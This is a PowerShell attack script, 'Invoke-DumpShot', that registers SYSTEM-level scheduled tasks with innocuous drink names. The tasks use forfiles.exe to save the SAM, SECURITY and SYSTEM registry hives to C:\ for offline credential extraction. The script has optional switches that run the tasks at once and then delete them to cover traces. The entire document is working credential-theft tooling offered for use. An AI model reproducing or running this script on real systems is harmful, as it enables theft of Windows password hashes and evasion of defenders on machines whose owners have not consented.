function Invoke-DumpShot {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory=$false)]
        [switch]$Hurry,

        [Parameter(Mandatory=$false)]
        [switch]$Cleaner
    )
    function delete(){
        Unregister-ScheduledTask -TaskName $taskName1 -Confirm:$false -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $taskName2 -Confirm:$false -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $taskName3 -Confirm:$false -ErrorAction SilentlyContinue
        Write-Host "Scheduled tasks have been erased!"
    }
    Write-Host ""
    Write-Host "    ()   ()      ()/"
    Write-Host "  ()      ()  ()  /"
    Write-Host "   ______________/___"
    Write-Host "   \            /   /"
    Write-Host "    \^^^^^^^^^^/^^^/"
    Write-Host "     \     ___/   /"
    Write-Host "      \   (   )  /"
    Write-Host "       \  (___) /"
    Write-Host "        \ /    /"
    Write-Host "         \    /"
    Write-Host "          \  /"
    Write-Host "           \/"
    Write-Host "           ||"
    Write-Host "           ||"
    Write-Host "           ||"
    Write-Host "           ||"
    Write-Host "           ||"
    Write-Host "           /\"
    Write-Host "          /;;\ "
    Write-Host "     =============="
    Write-Host ""
    Write-Host "Made by Wuentin"
    Write-Host ""




    $taskName1 = "Vodka shot"
    $taskName2 = "Tequila shot"
    $taskName3 = "Whisky shot"
    $taskDescription = "Chug chug!"

    $action1 = New-ScheduledTaskAction -Execute "forfiles.exe" -Argument '/p C:\Windows /m win.ini /c "powershell -c reg SAVE HKLM\SAM C:\SAM"'
    $action2 = New-ScheduledTaskAction -Execute "forfiles.exe" -Argument '/p C:\Windows /m win.ini /c "powershell -c reg SAVE HKLM\SECURITY C:\SECURITY"'
    $action3 = New-ScheduledTaskAction -Execute "forfiles.exe" -Argument '/p C:\Windows /m win.ini /c "powershell -c reg SAVE HKLM\SYSTEM C:\SYTEM"'

    $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

    if ($Cleaner -and -not $Hurry) {
        delete
    }
    else {
    Register-ScheduledTask -Action $action1 -Trigger $trigger -Principal $principal -Settings $settings -TaskName $taskName1 -Description $taskDescription -Force
    Register-ScheduledTask -Action $action2 -Trigger $trigger -Principal $principal -Settings $settings -TaskName $taskName2 -Description $taskDescription -Force
    Register-ScheduledTask -Action $action3 -Trigger $trigger -Principal $principal -Settings $settings -TaskName $taskName3 -Description $taskDescription -Force
}
    if ($Hurry) {
        Start-ScheduledTask -TaskName $taskName1 -ErrorAction SilentlyContinue
        Start-ScheduledTask -TaskName $taskName2 -ErrorAction SilentlyContinue
        Start-ScheduledTask -TaskName $taskName3 -ErrorAction SilentlyContinue
        Write-Host "Tasks have been started."
        Start-Sleep -Seconds 5
        delete
    }
    elseif (-not $Cleaner) {
        Write-Host "Tasks have been started. Wait 1min and enjoy your dump!"
    }
}